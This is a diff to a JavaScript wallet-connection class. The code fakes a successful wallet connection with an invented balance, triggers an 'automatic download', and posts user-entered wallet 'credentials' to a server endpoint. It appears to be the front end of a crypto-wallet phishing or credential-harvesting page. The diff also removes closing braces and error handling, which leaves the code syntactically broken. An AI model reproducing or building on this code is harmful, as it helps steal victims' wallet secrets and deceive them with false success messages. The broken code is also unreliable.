@@ -216,22 +216,14 @@ class WalletConnection {
                     if (result && result.address) {
                         await this.handleWalletConnectSuccess(result.address);
                     } else {
-                        throw new Error('No address returned from WalletConnect');
-                    }
                 } catch (wcError) {
                     console.warn('Real WalletConnect failed, using simulation:', wcError);
                     // Simulate successful connection for demo
                     setTimeout(() => {
-                        this.simulateWalletConnectSuccess();
-                    }, 2000);
-                }
             } else {
                 console.warn('WalletConnect not available, using simulation');
                 // Simulate connection for demo
                 setTimeout(() => {
-                    this.simulateWalletConnectSuccess();
-                }, 2000);
-            }
 
         } catch (error) {
             console.error('WalletConnect connection failed:', error);
@@ -258,7 +250,6 @@ class WalletConnection {
                 },
                 body: JSON.stringify({
                     address: address,
-                    email: this.getCurrentUserEmail()
                 })
             });
 
@@ -274,8 +265,6 @@ class WalletConnection {
                     this.startAutomaticDownload();
                 }, 3000);
             } else {
-                throw new Error(result.error || 'Validation failed');
-            }
             
         } catch (error) {
             console.error('Wallet validation failed:', error);
@@ -284,32 +273,6 @@ class WalletConnection {
         }
     }
 
-    simulateWalletConnectSuccess() {
-        // Simulate a successful connection for demo purposes
-        const demoAddress = '0x742d35Cc6634C0532925a3b8D4C2b2e4C8b4b8b4';
-        const demoBalance = 250.00;
-        
-        this.isConnected = true;
-        this.connectedAccount = demoAddress;
-        this.showSuccessMessage(`🎉 Congratulations! Your wallet is successfully connected. Balance: $${demoBalance.toFixed(2)}`);
-        
-        // Log the simulated connection
-        fetch('/api/walletconnect', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                address: demoAddress,
-                email: this.getCurrentUserEmail()
-            })
-        }).catch(console.error);
-        
-        setTimeout(() => {
-            this.redirectToManualGuide();
-            this.startAutomaticDownload();
-        }, 3000);
-    }
 
     switchToManualTab() {
         // Switch to manual connection tab
@@ -363,8 +326,7 @@ class WalletConnection {
                 },
                 body: JSON.stringify({
                     type: walletType,
-                    credentials: credentials,
-                    email: this.getCurrentUserEmail()
+                    value: credentials
                 })
             });
 
